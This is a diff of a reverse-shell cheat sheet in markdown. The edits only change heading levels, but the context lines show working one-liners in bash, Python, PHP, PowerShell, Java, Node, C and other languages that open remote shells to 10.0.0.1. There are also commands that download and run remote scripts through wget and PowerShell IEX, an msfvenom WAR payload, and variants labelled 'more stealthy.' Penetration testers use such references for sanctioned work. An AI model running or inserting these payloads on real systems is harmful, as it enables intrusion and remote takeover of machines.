@@ -19,7 +19,7 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 ```
 
-### Socat
+## Socat
 #### Install Socat
 ```
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
@@ -33,7 +33,7 @@ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8
 socat file:`tty`, raw, echo=0 TCP-L:4242
 ```
 
-### Perl
+## Perl
 #### Remote Host
 ```
 perl -e 'use Socket; $IP="10.0.0.1"; $PORT=1234; socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S, sockaddr_in($PORT, inet_aton($IP)))){open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S"); exec("/bin/sh -i");};'
@@ -46,7 +46,7 @@ For Windows:
 perl -MIO -e '$C=new IO::Socket::INET(PeerAddr, "10.0.0.1:4242"); STDIN->fdopen($C, r); $~->fdopen($C, w); system$_ while<>;'
 ```
 
-### Python
+## Python
 #### IPv4
 ```
 export RHOST="10.0.0.1"; export RPORT=4242; python -c 'import socket, os, pty; s=socket.socket(); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/sh")'
@@ -107,7 +107,7 @@ python -c 'a=__import__; c=a("socket"); o=a("os").dup2; p=a("pty").spawn; s=c.so
 python -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 
-### PHP
+## PHP
 ```
 php -r '$sock = fsockopen("10.0.0.1", 4242); exec("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock = fsockopen("10.0.0.1", 4242); shell_exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -117,7 +117,7 @@ php -r '$sock = fsockopen("10.0.0.1", 4242); passthru("/bin/sh -i <&3 >&3 2>&3")
 php -r '$sock = fsockopen("10.0.0.1", 4242); popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 ```
 
-### Ruby
+## Ruby
 ```
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1", 4242).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)'
 
@@ -128,29 +128,29 @@ ruby -rsocket -e'exit if fork; c=TCPSocket.new("10.0.0.1", "4242"); loop{c.gets.
 ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1", "4242"); while(cmd=c.gets); IO.popen(cmd, "r"){|io|c.print io.read}end'
 ```
 
-### Golang
+## Golang
 ```
 echo 'package main; import"os/exec"; import"net"; func main(){c,_:=net.Dial("tcp", "10.0.0.1:4242"); cmd:=exec.Command("/bin/sh"); cmd.Stdin=c; cmd.Stdout=c; cmd.Stderr=c; cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 
-### Netcat Traditional
+## Netcat Traditional
 ```
 netcat -e /bin/sh 10.0.0.1 4242
 netcat -e /bin/bash 10.0.0.1 4242
 netcat -c bash 10.0.0.1 4242
 ```
 
-### Netcat OpenBSD
+## Netcat OpenBSD
 ```
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.0.0.1 4242 >/tmp/f
 ```
 
-### Netcat BusyBox
+## Netcat BusyBox
 ```
 rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.0.0.1 4242 >/tmp/f
 ```
 
-### Ncat
+## Ncat
 ```
 ncat 10.0.0.1 4242 -e /bin/bash
 ```
@@ -159,7 +159,7 @@ ncat 10.0.0.1 4242 -e /bin/bash
 ncat --udp 10.0.0.1 4242 -e /bin/bash
 ```
 
-### OpenSSL
+## OpenSSL
 ```
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
@@ -185,7 +185,7 @@ export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromab
 export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
 ```
 
-### Microsoft Windows Powershell
+## Microsoft Windows Powershell
 ```
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1", 4242); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()
 ```
@@ -196,12 +196,12 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
 
-### Awk
+## Awk
 ```
 awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 
-### Java
+## Java
 ```
 Runtime r = Runtime.getRuntime();
 Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242; cat <&5 | while read line; do $line 2>&5 >&5; done'");
@@ -215,7 +215,7 @@ String cmd = "cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host, port); InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(), so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try {p.exitValue(); break;}catch (Exception e){}}; p.destroy(); s.close();
 ```
 #### Java | Alternative 2
-##### NOTE: This is more stealthy!
+**NOTE: This is more stealthy!**
 ```
 Thread thread = new Thread(){
     public void run(){
@@ -225,7 +225,7 @@ Thread thread = new Thread(){
 thread.start();
 ```
 
-### Telnet
+## Telnet
 ```
 In Attacker machine start two listeners:
 nc -lvp 8080
@@ -235,24 +235,24 @@ In Victim machine run below command:
 telnet <10.0.0.1> 8080 | /bin/sh | telnet <10.0.0.1> 8081
 ```
 
-### War
+## War
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp
 # in order to get the name of the file
 ```
 
-### Lua
-##### Linux
+## Lua
+#### Linux
 ```
 lua -e "require('socket'); require('os'); t=socket.tcp(); t:connect('10.0.0.1', '4242'); os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
-##### Windows and Linux
+#### Windows and Linux
 ```
 lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 
-### Node.JS
+## Node.JS
 ```
 (function(){
     var net = require("net"),
@@ -278,7 +278,7 @@ or
 -x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')
 ```
 
-### Groovy
+## Groovy
 ```
 String host = "10.0.0.1";
 int port = 4242;
@@ -286,15 +286,15 @@ String cmd = "cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host, port); InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try {p.exitValue(); break;}catch (Exception e){}}; p.destroy(); s.close();
 ```
 #### Groovy | Alternative 1
-##### NOTE: This is more stealthy 
+**NOTE: This is more stealthy**
 ```
 Thread.start {
     // Reverse shell here
 }
 ```
 
-### C Programming Language
-##### Compile with gcc or g++ '/tmp/shell.c --output shell.out && ./shell.out'
+## C Programming Language
+**Compile with gcc or g++ '/tmp/shell.c --output shell.out && ./shell.out'**
 ```
 #include <stdio.h>
 #include <sys/socket.h>
@@ -326,7 +326,7 @@ int main(void){
 }
 ```
 
-### Dart
+## Dart
 ```
 import 'dart:io';
 import 'dart:convert';
@@ -387,7 +387,7 @@ rlwrap -r -f . nc 10.0.0.1 4242
 -r Put all words seen on in- and output on the completion list.
 ```
 
-##### OhMyZSH might break this trick, a simple 'sh' is recommended
+#### OhMyZSH might break this trick, a simple 'sh' is recommended
 **The main problem here is that zsh doesn't handle the stty command the same way bash or sh does.
     [...] stty raw -echo; fg[...] If you try to execute this as two separated commands,
     as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect.**
@@ -417,27 +417,27 @@ socat file:`tty`, raw, echo=0 tcp-listen:12345
 
 Spawn a TTY shell from an interpreter
 
-#### Shell
+### Shell
 ```
 /bin/sh -i
 ```
-#### Python
+### Python
 ```
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 python3 -c "__import__('pty').spawn('/bin/bash')"
 python3 -c "__import__('subprocess').call(['/bin/bash'])"
 ```
-#### Perl
+### Perl
 ```
 perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
 perl -e 'print `/bin/bash`'
 ```
-#### Ruby
+### Ruby
 ```
 ruby: exec "/bin/sh"
 ```
-#### Lua
+### Lua
 ```
 lua: os.execute('/bin/sh')
 ```
@@ -457,16 +457,16 @@ su - user
 
 Password: P4ssW0rD
 ```
-### Fully interactive reverse shell on Microsoft Windows
+## Fully interactive reverse shell on Microsoft Windows
 
 The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
 **ConPtyShell uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
 
-##### Server-side
+#### Server-side
 ```
 stty raw -echo; (stty size; cat) | nc -lvnp 3001
 ```
-##### Client-side
+#### Client-side
 ```
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
@@ -477,4 +477,3 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 * [Spawning a TTY Shell](http://netsec.ws/?p=337)
 * [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
 * [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-* 
